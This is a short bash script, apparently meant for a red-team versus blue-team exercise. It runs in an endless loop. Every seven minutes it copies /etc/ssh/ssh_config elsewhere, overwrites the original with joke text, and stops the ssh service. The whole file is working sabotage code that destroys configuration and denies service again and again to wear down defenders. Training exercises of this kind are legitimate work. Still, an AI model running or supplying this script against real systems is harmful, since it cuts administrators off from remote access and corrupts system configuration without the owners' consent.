#!/bin/bash

# Loop forever
while true
do
 #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
 sleep 420

 #Generate random number, check if the number is even or odd
 if [ $(( $RANDOM % 2)) -eq 0 ]
 then
 #Copy config file to other location, then overwrite original
   cp '/etc/ssh/ssh_config' '/etc/mm_config'
   echo "I'm Batman" > '/etc/ssh/ssh_config'
 else
 #Copy config file to other location, then overwrite original
   cp '/etc/ssh/ssh_config' '/home/mm_config'
   echo "You ever dance with the devil in the pale mooon light?" > '/etc/ssh/ssh_config'
 fi
 
 #Stop ssh service
 sudo service ssh stop
done
